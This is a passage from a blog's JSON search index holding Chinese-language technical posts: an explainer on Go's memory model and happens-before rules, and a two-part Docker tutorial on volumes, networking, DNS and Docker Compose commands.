可能会丢失数据","tags":["golang"],"categories":["1_golang基础"]},{"title":"golang内存模型和happens_before","url":"%2Fp%2F6196d525.html","content":"\n\n\n### happens-before 术语\n\nhappens-before是一个术语，并不仅仅是Go语言才有的。简单的说，通常的定义如下：\n\n假设A和B表示一个多线程的程序执行的两个操作。如果A happens-before B，那么A操作对内存的影响 将对执行B的线程(且执行B之前)可见。 \n\n\n\n+ 无论使用哪种编程语言，有一点是相同的：如果操作A和B在相同的线程中执行，并且A操作的声明在B之前，那么A happens-before B。\n\n```\nint A, B;\nvoid foo()\n{\n  // This store to A ...\n  A = 5;\n  // ... effectively becomes visible before the following loads. Duh!\n  B = A * A;\n}\n```\n\n \n\n+ 还有一点是，在每门语言中，无论你使用那种方式获得，happens-before关系都是可传递的：如果A happens-before B，同时B happens-before C，那么A happens-before C。当这些关系发生在不同的线程中，传递性将变得非常有用。\n\n<!-- more -->\n\n\n\n刚接触这个术语的人总是容易误解，这里必须澄清的是，happens-before并不是指时序关系，并不是说A happens-before B就表示操作A在操作B之前发生。它就是一个术语，就像光年不是时间单位一样。具体地说：\n\n1.  **A happens-before B并不意味着A在B之前发生。**\n2.  **A在B之前发生并不意味着A happens-before B。**\n\n这两个陈述看似矛盾，其实并不是。如果你觉得很困惑，可以多读几篇它的定义。后面我会试着解释这点。记住，happens-before 是一系列语言规范中定义的操作间的关系。它和时间的概念独立。这和我们通常说”A在B之前发生”时表达的真实世界中事件的时间顺序不同。\n\n\n\n### A happens-before B并不意味着A在B之前发生 (编译器可能会重排)\n\n\n\n这里有个例子，其中的操作具有happens-before关系，但是实际上并不一定是按照那个顺序发生的。下面的代码执行了(1)对A的赋值，紧接着是(2)对B的赋值。\n\n```\nint A = 0;\nint B = 0;\nvoid main()\n{\n    A = B + 1; // (1)\n    B = 1; // (2)\n}\n```\n\n\n\n根据前面说明的规则，(1) happens-before (2)。但是，如果我们使用gcc -O2编译这个代码，编译器将产生一些指令重排序。有可能执行顺序是这样子的：\n\n```\n将B的值取到寄存器\n将B赋值为1\n将寄存器值加1后赋值给A\n```\n\n也就是到第二条机器指令(对B的赋值)完成时，对A的赋值还没有完成。换句话说，(1)并没有在(2)之前发生!\n\n那么，这里违反了happens-before关系了吗？让我们来分析下，根据定义，操作(1)对内存的影响必须在操作(2)执行之前对其可见。换句话说，对A的赋值必须有机会对B的赋值有影响.\n\n但是在这个例子中，对A的赋值其实并没有对B的赋值有影响。即便(1)的影响真的可见，(2)的行为还是一样。所以，这并不能算是违背happens-before规则。\n\n\n\n### A在B之前发生并不意味着A happens-before B (虽然在之前发生但不满足规则)\n\n下面这个例子中，所有的操作按照指定的顺序发生，但是并能不构成happens-before 关系。假设一个线程调用pulishMessage，同时，另一个线程调用consumeMessage。 由于我们并行的操作共享变量，为了简单，我们假设所有对int类型的变量的操作都是原子的。\n\n\n\n```\nint isReady = 0;\nint answer = 0;\nvoid publishMessage()\n{\n  answer = 42; // (1)\n  isReady = 1; // (2)\n}\nvoid consumeMessage()\n{\n  if (isReady)\t\t\t    // (3) <-- Let's suppose this line reads 1\n  \tprintf(\"%d\\n\", answer); // (4)\n}\n```\n\n\n\n根据程序的顺序，在(1)和(2)之间存在happens-before 关系，同时在(3)和(4)之间也存在happens-before关系。\n\n\n\n除此之外，我们假设在运行时，isReady读到1(是由另一个线程在(2)中赋的值)。在这中情形下，我们可知(2)一定在(3)之前发生。但是这并不意味着在(2)和(3)之间存在happens-before 关系!\n\nhappens-before 关系只在语言标准中定义的地方存在，这里并没有相关的规则说明(2)和(3)之间存在happens-before关系，即便(3)读到了(2)赋的值。\n\n还有，由于(2)和(3)之间，(1)和(4)之间都不存在happens-before关系，那么(1)和(4)的内存交互也可能被重排序 (要不然来自编译器的指令重排序，要不然来自处理器自身的内存重排序)。那样的话，即使(3)读到1，(4)也会打印出“0“。\n\n \n\n### Go关于同步的规则 (往冰箱放西瓜, 先放后拿,往手里递西瓜, 先接后放)\n\n\n\n关于channel的happens-before在Go的内存模型中提到了三种情况：\n\n- 对一个channel的发送操作 happens-before 相应channel的接收操作完成     \t  **(往冰箱放西瓜, 先放后拿)**\n- 关闭一个channel happens-before 从该Channel接收到最后的返回值0                \n\n- 不带缓冲的channel的接收操作 happens-before 相应channel的发送操作完成      **(往手里递西瓜, 先接后放) **     \n\n\n\n先看一个简单的例子：\n\n```\nvar c = make(chan int, 10)\nvar a string\nfunc f() {\n    a = \"hello, world\"  // (1)\n    c <- 0  // (2)\n}\nfunc main() {\n    go f()\n    <-c   // (3)\n    print(a)  // (4)\n}\n```\n\n上述代码可以确保输出\"hello, world\"，因为(1) happens-before (2)，(4) happens-after (3)，再根据上面的第一条规则(2)是 happens-before (3)的，最后根据happens-before的可传递性，于是有(1) happens-before (4)，也就是a = \"hello, world\" happens-before print(a)。\n\n\n\n再看另一个例子：\n\n```\nvar c = make(chan int)\nvar a string\nfunc f() {\n    a = \"hello, world\"  // (1)\n    <-c   // (2)\n}\nfunc main() {\n    go f()\n    c <- 0  // (3)\n    print(a)  // (4)\n}\n```\n\n根据上面的第三条规则(2) happens-before (3)，最终可以保证(1) happens-before (4)。\n\n\n\n\n\n如果我把上面的代码稍微改一点点，将c变为一个带缓存的channel，则print(a)打印的结果不能够保证是\"hello world\"。\n\n```\nvar c = make(chan int, 1)\nvar a string\nfunc f() {\n    a = \"hello, world\"  // (1)\n    <-c   // (2)\n}\nfunc main() {\n    go f()\n    c <- 0  // (3)\n    print(a)  // (4)\n}\n```\n\n因为这里不再有任何同步保证，使得(2) happens-before (3)。可以回头分析一下本节最前面的例子，也是没有保证happens-before条件。\n\n\n\n\n\n### golang happen before 的保证\n\n\n\n**1) 单线程**\n\n\n\n**2) Init 函数**\n\n- 如果包P1中导入了包P2，则P2中的init函数Happens Before 所有P1中的操作\n- main函数Happens After 所有的init函数\n\n\n\n3) **Goroutine**\n\n- Goroutine的创建Happens Before所有此Goroutine中的操作\n- Goroutine的销毁Happens After所有此Goroutine中的操作\n\n\n\n **4) Channel**\n\n- 对一个元素的send操作Happens Before对应的receive 完成操作\n- 对channel的close操作Happens Before receive 端的收到关闭通知操作\n- 对于Unbuffered Channel，对一个元素的receive 操作Happens Before对应的send完成操作\n- 对于Buffered Channel，假设Channel 的buffer 大小为C，那么对第k个元素的receive操作，Happens Before第k+C个send完成操作。可以看出上一条Unbuffered Channel规则就是这条规则C=0时的特例\n\n\n\n**5) Lock**\n\nGo里面有Mutex和RWMutex两种锁，RWMutex除了支持互斥的Lock/Unlock，还支持共享的RLock/RUnlock。\n\n- 对于一个Mutex/RWMutex，设n < m，则第n个Unlock操作Happens Before第m个Lock操作。\n- 对于一个RWMutex，存在数值n，RLock操作Happens After 第n个UnLock，其对应的RUnLock Happens Before 第n+1个Lock操作。\n\n*简单理解就是这一次的Lock总是Happens After上一次的Unlock，读写锁的RLock HappensAfter上一次的UnLock，其对应的RUnlock Happens Before 下一次的Lock。*\n\n```\nvar l sync.Mutex\nvar a string\nfunc f() {\n    a = \"hello, world\" // (1)\n    l.Unlock() // (2)\n}\nfunc main() {\n    l.Lock() // (3)\n    go f()\n    l.Lock() // (4)\n    print(a) // (5)\n}\n```\n\n(1) happens-before (2) happens-before (4) happens-before (5)\n\n\n\n**6) Once**\n\nonce.Do中执行的操作，Happens Before 任何一个once.Do调用的返回。","tags":["golang"],"categories":["2_golang底层"]},{"title":"docker基础入门教程(二)","url":"%2Fp%2Fcc94e38a.html","content":"\n\n\n# 5. 数据管理\n\n### 5.1 数据卷\n\n `数据卷` 是一个可供一个或多个容器使用的特殊目录，它绕过 UFS，可以提供很多有用的特性：\n\n- `数据卷` 可以在容器之间共享和重用\n- 对 `数据卷` 的修改会立马生效\n- 对 `数据卷` 的更新，不会影响镜像\n- `数据卷` 默认会一直存在，即使容器被删除\n\n注意：`数据卷` 的使用，类似于 Linux 下对目录或文件进行 mount，镜像中的被指定为挂载点的目录中的文件会隐藏掉，能显示看的是挂载的 `数据卷`。\n\n<!-- more -->\n\n### 5.2 选择 -v 还是 -–mount 参数\n\nDocker 新用户应该选择 `--mount` 参数，经验丰富的 Docker 使用者对 `-v` 或者 `--volume` 已经很熟悉了，但是推荐使用 `--mount` 参数。\n\n\n\n### 5.3 创建一个数据卷\n\n```\n$ docker volume create my-vol\n```\n\n\n\n查看所有的 `数据卷`\n\n```\n$ docker volume ls\n\nlocal               my-vol\n```\n\n\n\n在主机里使用以下命令可以查看指定 `数据卷` 的信息\n\n```\n$ docker volume inspect my-vol\n[\n    {\n        \"Driver\": \"local\",\n        \"Labels\": {},\n        \"Mountpoint\": \"/var/lib/docker/volumes/my-vol/_data\",\n        \"Name\": \"my-vol\",\n        \"Options\": {},\n        \"Scope\": \"local\"\n    }\n]\n```\n\n\n\n### 5.4 启动一个挂载数据卷的容器\n\n 在用 `docker run` 命令的时候，使用 `--mount` 标记来将 `数据卷` 挂载到容器里。在一次 `docker run`中可以挂载多个 `数据卷`。\n\n\n\n下面创建一个名为 `web` 的容器，并加载一个 `数据卷` 到容器的 `/webapp` 目录。\n\n \n\n```\n$ docker run -d -P \\\n    --name web \\\n    --mount source=my-vol,target=/webapp \\ \t\t\t\t(相似) # -v my-vol:/wepapp \\\n    training/webapp \\\n    python app.py\n```\n\n\n\n### 5.5 查看数据卷的具体信息\n\n在主机里使用以下命令可以查看 `web` 容器的信息\n\n```\n$ docker inspect web\n```\n\n\n\n`数据卷` 信息在 \"Mounts\" Key 下面\n\n```\n\"Mounts\": [\n    {\n        \"Type\": \"volume\",\n        \"Name\": \"my-vol\",\n        \"Source\": \"/var/lib/docker/volumes/my-vol/_data\",\n        \"Destination\": \"/app\",\n        \"Driver\": \"local\",\n        \"Mode\": \"\",\n        \"RW\": true,\n        \"Propagation\": \"\"\n    }\n],\n```\n\n\n\n### 5.6 删除数据卷\n\n```\n$ docker volume rm my-vol\n```\n\n\n\n`数据卷` 是被设计用来持久化数据的，它的生命周期独立于容器，Docker 不会在容器被删除后自动删除 `数据卷`，并且也不存在垃圾回收这样的机制来处理没有任何容器引用的 `数据卷`。如果需要在删除容器的同时移除数据卷。可以在删除容器的时候使用 `docker rm -v` 这个命令。\n\n\n\n 无主的数据卷可能会占据很多空间，要清理请使用以下命令\n\n```\n$ docker volume prune\n```\n\n\n\n### 5.7 挂载一个主机目录作为数据卷\n\n使用 `--mount` 标记可以指定挂载一个本地主机的目录到容器中去。\n\n```\n$ docker run -d -P \\\n    --name web \\\n    # -v /src/webapp:/opt/webapp \\\n    --mount type=bind,source=/src/webapp,target=/opt/webapp \\\n    training/webapp \\\n    python app.py\n```\n\n上面的命令加载主机的 `/src/webapp` 目录到容器的 `/opt/webapp`目录。这个功能在进行测试的时候十分方便，比如用户可以放置一些程序到本地目录中，来查看容器是否正常工作。本地目录的路径必须是绝对路径，以前使用 `-v` 参数时如果本地目录不存在 Docker 会自动为你创建一个文件夹，现在使用 `--mount`参数时如果本地目录不存在，Docker 会报错\n\n\n\nDocker 挂载主机目录的默认权限是 `读写`，用户也可以通过增加 `readonly` 指定为 `只读`。\n\n \n\n```\n$ docker run -d -P \\\n    --name web \\\n    # -v /src/webapp:/opt/webapp:ro \\\n    --mount type=bind,source=/src/webapp,target=/opt/webapp,readonly \\\n    training/webapp \\\n    python app.py\n```\n\n加了 `readonly` 之后，就挂载为 `只读` 了。如果你在容器内 `/opt/webapp` 目录新建文件，会显示如下错误\n\n```\n/opt/webapp # touch new.txt\ntouch: new.txt: Read-only file system\n```\n\n\n\n### 5.8 查看数据卷的具体信息\n\n在主机里使用以下命令可以查看 `web` 容器的信息\n\n```\n$ docker inspect web\n```\n\n`挂载主机目录` 的配置信息在 \"Mounts\" Key 下面\n\n```\n\"Mounts\": [\n    {\n        \"Type\": \"bind\",\t\t\t#此处为 bind\n        \"Source\": \"/src/webapp\",\n        \"Destination\": \"/opt/webapp\",\n        \"Mode\": \"\",\n        \"RW\": true,\n        \"Propagation\": \"rprivate\"\n    }\n],\n```\n\n\n\n### 5.9 挂载一个本地主机文件作为数据卷\n\n`--mount` 标记也可以从主机挂载单个文件到容器中\n\n```\n$ docker run --rm -it \\\n   # -v $HOME/.bash_history:/root/.bash_history \\\n   --mount type=bind,source=$HOME/.bash_history,target=/root/.bash_history \\\n   ubuntu:17.10 \\\n   bash\n\nroot@2affd44b4667:/# history\n1  ls\n2  diskutil list\n```\n\n这样就可以记录在容器输入过的命令了。\n\n\n\n# 6. 使用网络\n\n### 6.1 外部访问容器\n\n容器中可以运行一些网络应用，要让外部也可以访问这些应用，可以通过 `-P` 或 `-p` 参数来指定端口映射。\n\n当使用 `-P` 标记时，Docker 会随机映射一个 `49000~49900` 的端口到内部容器开放的网络端口。\n\n\n\n使用 `docker container ls` 可以看到，本地主机的 49155 被映射到了容器的 5000 端口。此时访问本机的 49155 端口即可访问容器内 web 应用提供的界面。\n\n```\n$ docker run -d -P training/webapp python app.py\n\n$ docker container ls -l\nCONTAINER ID  IMAGE                   COMMAND       CREATED        STATUS        PORTS                    NAMES\nbc533791f3f5  training/webapp:latest  python app.py 5 seconds ago  Up 2 seconds  0.0.0.0:49155->5000/tcp  nostalgic_morse\n```\n\n \n\n`-p` 则可以指定要映射的端口，并且，在一个指定端口上只可以绑定一个容器。支持的格式有 \n\n`ip:hostPort:containerPort | ip::containerPort | hostPort:containerPort`。\n\n\n\n### 6.2 映射所有接口地址 \n\n使用 `hostPort:containerPort` 格式本地的 5000 端口映射到容器的 5000 端口，可以执行\n\n```\n$ docker run -d -p 5000:5000 training/webapp python app.py\n```\n\n此时默认会绑定本地所有接口上的所有地址。\n\n\n\n### 6.3 映射到指定地址的指定端口  \n\n可以使用 `ip:hostPort:containerPort` 格式指定映射使用一个特定地址，比如 localhost 地址 127.0.0.1\n\n```\n$ docker run -d -p 127.0.0.1:5000:5000 training/webapp python app.py\n```\n\n\n\n### 6.4 映射到指定地址的任意端口\n\n使用 `ip::containerPort` 绑定 localhost 的任意端口到容器的 5000 端口，本地主机会自动分配一个端口。\n\n```\n$ docker run -d -p 127.0.0.1::5000 training/webapp python app.py\n```\n\n\n\n还可以使用 `udp` 标记来指定 `udp` 端口\n\n```\n$ docker run -d -p 127.0.0.1:5000:5000/udp training/webapp python app.py\n```\n\n\n\n### 6.5 查看映射端口配置\n\n 使用 `docker port` 来查看当前映射的端口配置，也可以查看到绑定的地址\n\n```\n$ docker port nostalgic_morse 5000\n127.0.0.1:49155.\n\n```\n\n\n\n- 容器有自己的内部网络和 ip 地址（使用 `docker inspect` 可以获取所有的变量，Docker 还可以有一个可变的网络配置。）\n- `-p` 标记可以多次使用来绑定多个端口\n\n例如\n\n```\n$ docker run -d \\\n    -p 5000:5000 \\\n    -p 3000:80 \\\n    training/webapp \\\n    python app.py\n```\n\n\n\n### 6.7 容器互联\n\n+ 新建网络\n\n 下面先创建一个新的 Docker 网络。\n\n```\n$ docker network create -d bridge my-net\n```\n\n`-d` 参数指定 Docker 网络类型，有 `bridge` `overlay`。其中 `overlay` 网络类型用于 [Swarm mode](https://yeasy.gitbooks.io/docker_practice/content/swarm_mode)\n\n\n\n+ 连接容器\n\n运行一个容器并连接到新建的 `my-net` 网络\n\n```\n$ docker run -it --rm --name busybox1 --network my-net busybox sh\n```\n\n\n\n打开新的终端，再运行一个容器并加入到 `my-net` 网络\n\n```\n$ docker run -it --rm --name busybox2 --network my-net busybox sh\n```\n\n\n\n再打开一个新的终端查看容器信息\n\n```\n$ docker container ls\n\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES\nb47060aca56b        busybox             \"sh\"                11 minutes ago      Up 11 minutes                           busybox2\n8720575823ec        busybox             \"sh\"                16 minutes ago      Up 16 minutes                           busybox1\n```\n\n\n\n下面通过 `ping` 来证明 `busybox1` 容器和 `busybox2` 容器建立了互联关系。\n\n在 `busybox1` 容器输入以下命令\n\n```\n/ # ping busybox2\nPING busybox2 (172.19.0.3): 56 data bytes\n64 bytes from 172.19.0.3: seq=0 ttl=64 time=0.072 ms\n64 bytes from 172.19.0.3: seq=1 ttl=64 time=0.118 ms\n```\n\n\n\n用 ping 来测试连接 `busybox2` 容器，它会解析成 `172.19.0.3`。\n\n同理在 `busybox2` 容器执行 `ping busybox1`，也会成功连接到。\n\n```\n/ # ping busybox1\nPING busybox1 (172.19.0.2): 56 data bytes\n64 bytes from 172.19.0.2: seq=0 ttl=64 time=0.064 ms\n64 bytes from 172.19.0.2: seq=1 ttl=64 time=0.143 ms\n```\n\n这样，`busybox1` 容器和 `busybox2` 容器建立了互联关系。\n\n如果你有多个容器之间需要互相连接，推荐使用 [Docker Compose](https://yeasy.gitbooks.io/docker_practice/content/compose)。\n\n\n\n### 6.8 配置 DNS\n\n 如何自定义配置容器的主机名和 DNS 呢？秘诀就是 Docker 利用虚拟文件来挂载容器的 3 个相关配置文件。\n\n在容器中使用 `mount` 命令可以看到挂载信息：\n\n```\n$ mount\n/dev/disk/by-uuid/1fec...ebdf on /etc/hostname type ext4 ...\n/dev/disk/by-uuid/1fec...ebdf on /etc/hosts type ext4 ...\ntmpfs on /etc/resolv.conf type tmpfs ...\n```\n\n这种机制可以让宿主主机 DNS 信息发生更新后，所有 Docker 容器的 DNS 配置通过 `/etc/resolv.conf`文件立刻得到更新。\n\n配置全部容器的 DNS ，也可以在 `/etc/docker/daemon.json` 文件中增加以下内容来设置。\n\n```\n{\n  \"dns\" : [\n    \"114.114.114.114\",\n    \"8.8.8.8\"\n  ]\n} \n```\n\n\n\n如果用户想要手动指定容器的配置，可以在使用 `docker run` 命令启动容器时加入如下参数：\n\n `-h HOSTNAME` 或者 `--hostname=HOSTNAME` 设定容器的主机名，它会被写到容器内的 `/etc/hostname`和 `/etc/hosts`。但它在容器外部看不到，既不会在 `docker container ls` 中显示，也不会在其他的容器的 `/etc/hosts` 看到。\n\n\n\n`--dns=IP_ADDRESS` 添加 DNS 服务器到容器的 `/etc/resolv.conf` 中，让容器用这个服务器来解析所有不在 `/etc/hosts` 中的主机名。\n\n\n\n`--dns-search=DOMAIN` 设定容器的搜索域，当设定搜索域为 `.example.com` 时，在搜索一个名为 host 的主机时，DNS 不仅搜索 host，还会搜索 `host.example.com`。\n\n\n\n> 注意：如果在容器启动时没有指定最后两个参数，Docker 会默认用主机上的 `/etc/resolv.conf` 来配置容器。\n\n\n\n# 7. Docker Compose(组成) 项目\n\n### 7.1 Compose 简介\n\n`Compose` 项目是 Docker 官方的开源项目，负责实现对 Docker 容器集群的快速编排。\n\n\n\n在日常工作中，经常会碰到需要多个容器相互配合来完成某项任务的情况。例如要实现一个 Web 项目，除了 Web 服务容器本身，往往还需要再加上后端的数据库服务容器，甚至还包括负载均衡容器等。\n\n\n\n`Compose` 恰好满足了这样的需求。它允许用户通过一个单独的 `docker-compose.yml` 模板文件（YAML 格式）来\t定义一组相关联的应用容器为一个项目（project）。\n\n \n\n`Compose` 中有两个重要的概念：\n\n- 服务 (`service`)：一个应用的容器，*实际上可以包括若干运行相同镜像的容器实例。*\n- 项目 (`project`)：由一组关联的应用容器组成的一个完整业务单元，在 `docker-compose.yml` 文件中定义。\n\n\n\n一个项目可以由多个服务（容器）关联而成，`Compose` 面向项目进行管理。\n\n\n\n### 7.2 安装与卸载\n\n- `Compose` 可以通过 Python 的包管理工具 `pip` 进行安装\n\n- 也可以直接下载编译好的二进制文件使用\n- 甚至能够直接在 Docker 容器中运行\n\n前两种方式是传统方式，适合本地环境下安装使用；最后一种方式则不破坏系统环境，更适合云计算场景。\n\n```\n$ docker-compose --version\ndocker-compose version 1.21.0, build 5920eb0\n```\n\n\n\n8.3 Compose 命令说明使用\n\n对于 Compose 来说，大部分命令的对象既可以是项目本身，也可以指定为项目中的服务或者容器。如果没有特别的说明，命令对象将是项目，这意味着项目中所有的服务都会受到命令影响。\n\n \n\n`docker-compose` 命令的基本的使用格式是\n\n```\ndocker-compose [-f=<arg>...] [options] [COMMAND] [ARGS...]\n```\n\n \n\n命令选项\n\n- `-f, --file FILE` 指定使用的 Compose 模板文件，默认为 `docker-compose.yml`，可以多次指定。\n- `-p, --project-name NAME` 指定项目名称，默认将使用所在目录名称作为项目名。\n- `--x-networking` 使用 Docker 的可拔插网络后端特性\n- `--x-network-driver DRIVER` 指定网络后端的驱动，默认为 `bridge`\n- `--verbose` 输出更多调试信息。\n- `-v, --version` 打印版本并退出。\n\n \n\n命令使用说明\n\n\n\n8.1 `build` 构建（重新构建）项目中的服务容器\n\n格式为 `docker-compose build [options] [SERVICE...]`。\n\n服务容器一旦构建后，将会带上一个标记名，例如对于 web 项目中的一个 db 容器，可能是 web_db。\n\n可以随时在项目目录下运行 `docker-compose build` 来重新构建服务。\n\n选项包括：\n\n- `--force-rm` 删除构建过程中的临时容器。\n- `--no-cache` 构建镜像过程中不使用 cache（这将加长构建过程）。\n- `--pull` 始终尝试通过 pull 来获取更新版本的镜像。\n\n\n\n8.2 `config` 验证 Compose 文件格式是否正确，若正确则显示配置，若格式错误显示错误原因\n\n\n\n8.3 `down` 此命令将会停止 `up` 命令所启动的容器，并移除网络\n\n\n\n8.4 `exec` 进入指定的容器\n\n\n\n8.5 `help` 获得一个命令的帮助\n\n\n\n8.6 `images` 列出 Compose 文件中包含的镜像\n\n\n\n8.7 `kill` 通过发送 `SIGKILL` 信号来强制停止服务容器\n\n格式为 `docker-compose kill [options] [SERVICE...]`。\n\n支持通过 `-s` 参数来指定发送的信号，例如通过如下指令发送 `SIGINT` 信号。\n\n```\n$ docker-compose kill -s SIGINT\n```\n\n\n\n8.8 `logs` 查看服务容器的输出\n\n格式为 `docker-compose logs [options] [SERVICE...]`。\n\n默认情况下，docker-compose 将对不同的服务输出使用不同的颜色来区分。可以通过 `--no-color` 来关闭颜色。\n\n该命令在调试问题的时候十分有用。\n\n\n\n8.9 `pause` 暂停一个服务容器\n\n格式为 `docker-compose pause [SERVICE...]`。\n\n\n\n8.10 `port` 打印某个容器端口所映射的公共端口\n\n格式为 `docker-compose port [options] SERVICE PRIVATE_PORT`。\n\n选项：\n\n- `--protocol=proto` 指定端口协议，tcp（默认值）或者 udp。\n- `--index=index` 如果同一服务存在多个容器，指定命令对象容器的序号（默认为 1）。\n\n  \n\n8.11 `ps` 列出项目中目前的所有容器\n\n格式为 `docker-compose ps [options] [SERVICE...]`。\n\n选项：\n\n- `-q` 只打印容器的 ID 信息。\n\n\n\n8.12 `pull` 拉取服务依赖的镜像\n\n格式为 `docker-compose pull [options] [SERVICE...]`。\n\n选项：\n\n- `--ignore-pull-failures` 忽略拉取镜像过程中的错误。\n\n\n\n8.13 `push` 推送服务依赖的镜像到 Docker 镜像仓库\n\n\n\n8.14 `restart` 重启项目中的服务\n\n格式为 `docker-compose restart [options] [SERVICE...]`。\n\n选项：\n\n- `-t, --timeout TIMEOUT` 指定重启前停止容器的超时（默认为 10 秒）。\n\n\n\n8.15 `rm` 删除所有（停止状态的）服务容器\n\n推荐先执行 `docker-compose stop` 命令来停止容器。\n\n格式为 `docker-compose rm [options] [SERVICE...]`。\n\n选项：\n\n- `-f, --force` 强制直接删除，包括非停止状态的容器。一般尽量不要使用该选项。\n- `-v` 删除容器所挂载的数据卷。\n\n \n\n8.16 `run` 在指定服务上执行一个命令\n\n格式为 `docker-compose run [options] [-p PORT...] [-e KEY=VAL...] SERVICE [COMMAND] [ARGS...]`。\n\n例如：\n\n```\n$ docker-compose run ubuntu ping docker.com\n```\n\n将会启动一个 ubuntu 服务容器，并执行 `ping docker.com` 命令。\n\n默认情况下，如果存在关联，则所有关联的服务将会自动被启动，除非这些服务已经在运行中。\n\n\n\n该命令类似启动容器后运行指定的命令，相关卷、链接等等都将会按照配置自动创建。\n\n两个不同点：\n\n- 给定命令将会覆盖原有的自动运行命令；\n- 不会自动创建端口，以避免冲突。\n\n如果不希望自动启动关联的容器，可以使用 `--no-deps` 选项，例如\n\n```\n$ docker-compose run --no-deps web python manage.py shell\n```\n\n将不会启动 web 容器所关联的其它容器。\n\n选项：\n\n- `-d` 后台运行容器。\n- `--name NAME` 为容器指定一个名字。\n- `--entrypoint CMD` 覆盖默认的容器启动指令。\n- `-e KEY=VAL` 设置环境变量值，可多次使用选项来设置多个环境变量。\n- `-u, --user=\"\"` 指定运行容器的用户名或者 uid。\n- `--no-deps` 不自动启动关联的服务容器。\n- `--rm` 运行命令后自动删除容器，`d` 模式下将忽略。\n- `-p, --publish=[]` 映射容器端口到本地主机。\n- `--service-ports` 配置服务端口并映射到本地主机。\n- `-T` 不分配伪 tty，意味着依赖 tty 的指令将无法运行。\n\n \n\n8.17 `scale` 设置指定服务运行的容器个数\n\n格式为 `docker-compose scale [options] [SERVICE=NUM...]`。\n\n通过 `service=num` 的参数来设置数量。例如：\n\n```\n$ docker-compose scale web=3 db=2\n```\n\n将启动 3 个容器运行 web 服务，2 个容器运行 db 服务。\n\n一般的，当指定数目多于该服务当前实际运行容器，将新创建并启动容器；反之，将停止容器。\n\n选项：\n\n- `-t, --timeout TIMEOUT` 停止容器时候的超时（默认为 10 秒）。\n\n\n\n8.18 `start` 启动已经存在的服务容器\n\n格式为 `docker-compose start [SERVICE...]`。\n\n\n\n8.19 `stop` 停止已经处于运行状态的容器，但不删除它\n\n通过 `docker-compose start` 可以再次启动这些容器。\n\n格式为 `docker-compose stop [options] [SERVICE...]`。\n\n选项：\n\n- `-t, --timeout TIMEOUT` 停止容器时候的超时（默认为 10 秒）。\n\n\n\n8.20 `top` 查看各个服务容器内运行的进程\n\n \n\n8.21 `unpause` 恢复处于暂停状态中的服务\n\n格式为 `docker-compose unpause [SERVICE...]`。\n\n\n\n8.22 `up` 启动一个项目\n\n格式为 `docker-compose up [options] [SERVICE...]`。\n\n该命令十分强大，它将尝试自动完成包括构建镜像，（重新）创建服务，启动服务，并关联服务相关容器的一系列操作。\n\n链接的服务都将会被自动启动，除非已经处于运行状态。\n\n可以说，大部分时候都可以直接通过该命令来启动一个项目。\n\n\n\n默认情况，`docker-compose up` 启动的容器都在前台，控制台将会同时打印所有容器的输出信息，可以很方便进行调试。\n\n当通过 `Ctrl-C` 停止命令时，所有容器将会停止。\n\n如果使用 `docker-compose up -d`，将会在后台启动并运行所有的容器。一般推荐生产环境下使用该选项。\n\n默认情况，如果服务容器已经存在，`docker-compose up` 将会尝试停止容器，然后重新创建（保持使用 `volumes-from` 挂载的卷），以保证新启动的服务匹配 `docker-compose.yml` 文件的最新内容。如果用户不希望容器被停止并重新创建，可以使用 `docker-compose up --no-recreate`。这样将只会启动处于停止状态的容器，而忽略已经运行的服务。如果用户只想重新部署某个服务，可以使用 `docker-compose up --no-deps -d <SERVICE_NAME>` 来重新创建服务并后台停止旧服务，启动新服务，并不会影响到其所依赖的服务。\n\n选项：\n\n- `-d` 在后台运行服务容器。\n- `--no-color` 不使用颜色来区分不同的服务的控制台输出。\n- `--no-deps` 不启动服务所链接的容器。\n- `--force-recreate` 强制重新创建容器，不能与 `--no-recreate` 同时使用。\n- `--no-recreate` 如果容器已经存在了，则不重新创建，不能与 `--force-recreate` 同时使用。\n- `--no-build` 不自动构建缺失的服务镜像。\n- `-t, --timeout TIMEOUT` 停止容器时候的超时（默认为 10 秒）。\n\n\n\n8.23 `version` 打印版本信息\n\n格式为 `docker-compose version`。\n\n\n\n8.24 Compose 模板文件\n\n模板文件是使用 `Compose` 的核心，涉及到的指令关键字也比较多。大部分指令跟 `docker run` 相关参数的含义都是类似的。\n\n\n\n默认的模板文件名称为 `docker-compose.yml`，格式为 YAML 格式。\n\n```\nversion: \"3\"\n\nservices:\n  webapp:\n    image: examples/web\n    ports:\n      - \"80:80\"\n    volumes:\n      - \"/data\"\n```\n\n\n\n注意每个服务都必须通过 `image` 指令指定镜像或 `build` 指令（需要 Dockerfile）等来自动构建生成镜像。\n\n如果使用 `build` 指令，在 `Dockerfile` 中设置的选项(例如：`CMD`, `EXPOSE`, `VOLUME`, `ENV` 等) 将会自动被获取，无需在 `docker-compose.yml` 中再次设置。\n\n\n\n# 8. 参考资料\n\n+ docker基础入门教程(一) https://www.liuvv.com/p/63a578e8.html\n\n","tags":["docker"],"categories":["docker"]},{"title":"docker基础入门教程(一)","url":"%2Fp%2F63a578e8.html","content":"\n\n\n# 1. 基本概念\n\n### 1.1 镜像\n\n镜像包含操作系统完整的 `root` 文件系统，其体积往往是庞大的，因此在 Docker 设计时，就充分利用 Union FS 的技术，将其设计为分层存储的架构。所以严格来说，镜像并非是像一个 ISO 那样的打包文件，镜像只是一个虚拟的概念，其实际体现并非由一个文件组成，而是由一组文件系统组成，或者说，由多层文件系统联合组成。\n\n<!-- more -->\n\n### 1.2 容器\n\n每一个容器运行时，是以镜像为基础层，在其上创建一个当前容器的存储层，我们可以称这个为容器运行时读写而准备的存储层为容器存储层。\n\n\n\n容器不应该向其存储层内写入任何数据，容器存储层要保持无状态化。所有的文件写入操作，都应该使用 数据卷（Volume）、或者绑定宿主目录，在这些位置的读写会跳过容器存储层，直接对宿主（或网络存储）发生读写，其性能和稳定性更高。\n\n数据卷的生存周期独立于容器，容器消亡，数据卷不会消亡。因此，使用数据卷后，容器删除或者重新运行之后，数据却不会丢失。\n\n\n\n### 1.3 仓库\n\n一个仓库会包含同一个软件不同版本的镜像，而标签就常用于对应该软件的各个版本。我们可以通过 `<仓库名>:<标签>` 的格式来指定具体是这个软件哪个版本的镜像。如果不给出标签，将以 `latest` 作为默认标签。\n\n\n\n以 Ubuntu 镜像 为例，`ubuntu` 是仓库的名字，其内包含有不同的版本标签，如，`14.04`, `16.04`。我们可以通过 `ubuntu:14.04`，或者 `ubuntu:16.04` 来具体指定所需哪个版本的镜像。如果忽略了标签，比如 `ubuntu`，那将视为 `ubuntu:latest`。\n\n\n\n仓库名经常以 *两段式路径* 形式出现，比如 